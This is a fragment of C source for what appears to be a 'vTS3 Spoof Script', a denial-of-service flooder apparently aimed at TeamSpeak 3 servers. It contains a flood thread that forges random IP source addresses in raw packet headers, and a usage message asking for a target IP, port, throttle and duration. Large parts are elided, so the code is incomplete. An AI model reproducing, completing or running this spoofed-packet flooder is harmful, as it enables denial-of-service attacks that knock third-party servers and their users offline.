...
void *flood(void *par1)
{
	...
	//	iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
	                iph->saddr = (rand_cmwc() >> 16 & 0xFF) << 24 | (165) << 16  | (238) << 8 | (195);
...
int main(int argc, char *argv[ ])
{
        if(argc < 4){
                ...
                fprintf(stderr, "vTS3 Batu07040@DJPizza!\n");
                fprintf(stdout, "Usage: %s <target IP> <port> <throttle> <time> < Src 185.x.x.x Or Null >\n", argv[0]);
                exit(-1);
        }
        int i = 0;
        ...
        fprintf(stdout, "vTS3 Spoof Script & Batu07040@DJPizza |\n");
        if(argc > 4)
        {
                sleep(atoi(argv[4]));
        } else {
